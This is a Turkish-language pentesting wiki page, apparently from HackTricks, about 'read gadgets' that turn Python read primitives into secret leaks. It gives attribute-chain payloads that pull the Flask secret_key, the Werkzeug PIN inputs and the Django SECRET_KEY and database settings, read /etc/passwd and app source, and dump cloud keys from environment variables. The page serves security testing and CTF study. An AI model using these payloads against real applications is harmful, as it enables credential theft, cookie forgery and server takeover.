# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Temel Bilgiler

[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) veya [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) gibi farklı zafiyetler, **Python dahili verilerini okumanıza ancak kod çalıştırmanıza izin vermeyebilir**. Bu nedenle bir pentester, **hassas yetkiler elde etmek ve zafiyeti yükseltmek** için bu okuma izinlerinden mümkün olduğunca yararlanmalıdır.

### Flask - secret key okuma

Bir Flask uygulamasının ana sayfasında muhtemelen bu **secret'ın yapılandırıldığı** **`app`** global nesnesi bulunur.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Bu durumda, [**Bypass Python sandboxes page**] sayfasındaki herhangi bir gadget'ı kullanarak **global objects erişmek** mümkündür.

**vulnerability farklı bir python dosyasındaysa**, ana dosyaya ulaşmak ve **global object `app.secret_key`** değerine erişerek bu anahtarı bilmek suretiyle [**privileges escalate**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) için dosyalar arasında ilerleyebilen bir gadget gerekir.

[Bu writeup'tan](https://ctftime.org/writeup/36082) alınan aşağıdaki gibi bir payload:
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Bu payload'u **`app.secret_key` okumak** için kullanın. Orijinal bug size ayrıca bir write primitive (örneğin class pollution) sağlıyorsa aynı path, bunu değiştirmek ve daha ayrıcalıklı Flask cookie'lerini imzalamak için kullanılabilir.

### Werkzeug - machine_id ve node uuid

[**Bu writeup'taki payload'ları kullanarak**](https://vozec.fr/writeups/tweedle-dum-dee/) **machine_id** ve **uuid** node'a erişebileceksiniz. Bunlar, [**Werkzeug pin'i oluşturmak**](../../network-services-pentesting/pentesting-web/werkzeug.md) ve `/console` içindeki Python console'a erişmek için ihtiyaç duyduğunuz **private bit'lerdir**; bunun için **debug mode etkin** olmalıdır:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Web sayfasında bazı **error** oluşturarak **sunucunun `app.py` dosyasına ait yerel yolunu** elde edebileceğinizi unutmayın; bu **error** size yolu **verir**.

Vulnerability farklı bir Python dosyasındaysa, ana Python dosyasındaki object'lere erişmek için önceki Flask trick'ini kontrol edin.

### Django - SECRET_KEY and settings module

Django settings object'i, uygulama başladıktan sonra `sys.modules` içinde cache'lenir. Yalnızca read primitive'leriyle **`SECRET_KEY`**, fallback key'leri, database credentials veya signing salts leak edilebilir:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Savunmasız gadget başka bir module içindeyse, önce globals üzerinde ilerleyin:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS`, mevcut `SECRET_KEY` kadar değerlidir: anahtar rotasyonu sırasında eski imzalı değerleri doğrulamaya devam ederler. Ayrıca etkinin yalnızca cookie forgery mi yoksa daha güçlü bir şey mi olduğunu hızlıca belirlemek için `SESSION_ENGINE` ve `SESSION_SERIALIZER` değerlerini de leak edin. Web etkisiyle ilgili ayrıntılar için [**Django pentesting sayfasına**](../../network-services-pentesting/pentesting-web/django.md) bakın.

### Module loader gadgets - kaynak kodunu ve dosyaları okuma

Yüklenen Python modülleri genellikle bir `__loader__` nesnesini korur. Dosya tabanlı loader'lar çoğunlukla `get_source()` ve `get_data()` işlevlerini sunar; bunlar, bir module object'e erişebildiğiniz ancak `open()` işlevine erişemediğiniz durumlarda mükemmel **salt okunur primitive'lerdir**:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Bu, **config modules, blueprints, helper files veya hidden routes** dökmek ve API keys, DSNs, flag paths ya da ek gadget entry points kurtarmak için çok kullanışlıdır.

Yalnızca subclass enumeration varsa, hard-coding bir index yerine loader'ı ada göre arayın:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

Bir generator/coroutine object'i oluşturabilir veya ona erişebilirseniz, frame'i herhangi bir function `__globals__` gadget'ına ihtiyaç duymadan globals leak edebilir. Bu, yalnızca dunder isimlerini engelleyen ve `gi_frame`, `ag_frame`, `cr_frame` veya `f_globals` gibi frame attribute'larını unutan filter'lara karşı kullanışlıdır:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Frame globals'larına sahip olduktan sonra diğer gadget'larda (`sys.modules`, settings objects, `os.environ`, vb.) olduğu gibi devam edin. Son sandbox escape'leri, `gi_frame` ve `f_globals` dunder attributes olmadığından ve çoğu zaman naif deny-list'lerden kurtulduğundan bunu tekrar tekrar keşfediyor.

### Loaded modules üzerinden environment variables / cloud creds

Birçok jail hâlâ bir yerde `os` veya `sys` import ediyor. Ulaşılabilir herhangi bir `__init__.__globals__` function'ını kullanarak zaten import edilmiş `os` module'üne pivot yapabilir ve **environment variables** içindeki API token'larını, cloud key'lerini veya flag'leri dump edebilirsiniz:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Alt sınıf indeksi filtrelenmişse loader'ları kullanın:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Environment değişkenleri, read işleminden full compromise'a geçmek için sıklıkla gereken tek secret'lardır (cloud IAM key'leri, database URL'leri, signing key'leri vb.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) hazırlanmış component request'leri aracılığıyla **class pollution** işlemine izin veriyordu. `__init__.__globals__` gibi bir property path ayarlamak, saldırganın component module globals'ına ve import edilmiş modüllere (ör. `settings`, `os`, `sys`) erişmesini sağlıyordu. Buradan code execution olmadan `SECRET_KEY`, `DATABASES` veya service credential'larını leak edebilirsiniz. Exploit chain tamamen read tabanlıdır ve yukarıdakiyle aynı dunder-gadget pattern'lerini kullanır.

### Chaining için gadget collection'ları

Yakın tarihli CTF'ler ve pyjail araştırmaları, yalnızca attribute access ve subclass enumeration kullanılarak oluşturulan güvenilir read chain'leri göstermektedir. [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) gibi community-maintained listeler, object'lerden `__globals__`, `sys.modules` ve nihayetinde sensitive data'ya geçiş yapmak için birleştirebileceğiniz yüzlerce minimal gadget'ı kataloglar. Raw subclass index'leri yerine attribute/name tabanlı aramaları tercih edin; çünkü `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` vb. öğelerin konumu Python sürümleri arasında ve ek import edilmiş library'lerle birlikte değişir.

## References

- [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
